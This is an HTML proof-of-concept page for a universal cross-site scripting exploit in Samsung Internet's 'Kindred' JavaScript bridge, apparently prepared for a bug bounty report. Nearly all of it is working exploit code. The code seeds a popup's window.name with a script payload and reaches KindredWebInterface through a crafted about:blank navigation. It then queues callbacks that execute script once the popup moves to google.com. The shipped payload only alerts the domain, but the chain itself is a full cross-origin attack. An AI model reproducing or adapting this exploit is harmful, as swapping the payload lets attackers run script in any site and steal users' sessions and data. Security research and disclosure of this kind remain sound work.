<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Samsung Kindred UXSS — variant (direct-eval callback, benign)</title>
  <style>
    body { max-width: 760px; margin: 40px auto; padding: 0 20px; font: 16px/1.5 system-ui, sans-serif; }
    button { padding: 12px 18px; font: inherit; font-weight: 650; width:100%; margin:6px 0; }
    pre { min-height: 12em; padding: 14px; overflow-wrap: anywhere; white-space: pre-wrap; background: #f3f4f6; }
    .warn{color:#b23;font-size:12px}
  </style>
</head>
<body>
  <main id="main">
    <h1>Samsung Kindred UXSS — variant</h1>
    <p class="warn">Benign: proof is alert(document.domain) only. No defacement, no data theft. Own build. Samsung Mobile Security Rewards.</p>
    <button id="runDirect" type="button">A · run with DIRECT-EVAL callback: alert(document.domain)</button>
    <button id="runName" type="button">fallback · run with callback: window.name.toString</button>
    <pre id="log" aria-live="polite"></pre>
  </main>

  <script>
  (() => {
    'use strict';

    const params = new URLSearchParams(location.search);
    if (params.has('bootstrap')) {
      document.querySelector('#main').innerHTML =
        '<h1>Attacker bootstrap document</h1><p>Waiting for the parent controller.</p>';
      return;
    }

    const output = document.querySelector('#log');
    const runDirect = document.querySelector('#runDirect');
    const runName = document.querySelector('#runName');
    let running = false;

    function log(message) {
      const stamp = new Date().toISOString().slice(11, 23);
      output.textContent += `[${stamp}] ${message}\n`;
    }

    const vm = /SamsungBrowser\/([\d.]+)/.exec(navigator.userAgent);
    log('SamsungBrowser=' + (vm ? vm[1] : 'NOT DETECTED — open in Samsung Internet'));

    function bootstrapUrl() {
      const url = new URL(location.href);
      url.searchParams.set('bootstrap', String(Date.now()));
      url.hash = 'attacker-bootstrap';
      return url.href;
    }

    // BENIGN payload (was PWNED defacement). For the window.name.toString path.
    const PAYLOAD = '<scr' + 'ipt>alert("BENIGN UXSS — ran as "+document.domain);</scr' + 'ipt>';

    function run(cb) {
      if (running) return;

      const popup = open(bootstrapUrl(), '_blank');
      if (!popup) { log('popup blocked; tap the button for the reliable path'); return; }

      running = true;
      runDirect.disabled = runName.disabled = true;
      log('popup opened; callback="' + cb + '"');

      popup.name = PAYLOAD;
      log('seeded window.name with benign domain-proof payload');

      setTimeout(() => {
        try { popup.location.replace('about:blank#kindred-probe://amazon.com/'); log('navigated popup to parser-confused inherited about:blank'); }
        catch (error) { log(`about:blank navigation failed: ${error}`); }
      }, 750);

      setTimeout(() => {
        try { popup.location.reload(); log('reloaded crafted about:blank to materialize KindredWebInterface'); }
        catch (error) { log(`reload failed: ${error}`); }
      }, 2000);

      const started = performance.now();
      const poll = setInterval(() => {
        if (performance.now() - started > 20000) {
          clearInterval(poll); running = false; runDirect.disabled = runName.disabled = false;
          log('timed out waiting for KindredWebInterface');
          return;
        }
        try {
          if (typeof popup.KindredWebInterface === 'undefined') return;
          clearInterval(poll);
          log('KindredWebInterface acquired in attacker-origin document');

          // enumerate once so renamed methods / other sinks are visible
          try { const ms=[]; for (const k in popup.KindredWebInterface) ms.push(k); log('bridge methods: '+(ms.join(', ')||'(none enumerable)')); } catch(e){}

          const guardProof = popup.KindredWebInterface.isCheckoutPage('amazon.com');
          log(`guarded bridge method executed; result=${guardProof}`);

          for (let i = 0; i < 10; i++) {
            popup.KindredWebInterface.findCouponsAndTemplates(`uxss-delay-${Date.now()}-${i}.amazon.com`, '', cb, 1);
          }
          popup.KindredWebInterface.findCouponsAndTemplates('amazon.com', '', cb, 1);
          log(`queued findCouponsAndTemplates callback="${cb}"`);

          popup.location.replace('https://www.google.com/');
          log('navigated popup to unmodified https://www.google.com/ — if UXSS fires you get alert "ran as www.google.com"');
          running = false; runDirect.disabled = runName.disabled = false;
        } catch (error) {
          clearInterval(poll); running = false; runDirect.disabled = runName.disabled = false;
          log(`exploit setup failed: ${error}`);
        }
      }, 100);
    }

    runDirect.addEventListener('click', () => run('alert(document.domain)'));
    runName.addEventListener('click', () => run('window.name.toString'));
  })();
  </script>
</body>
</html>
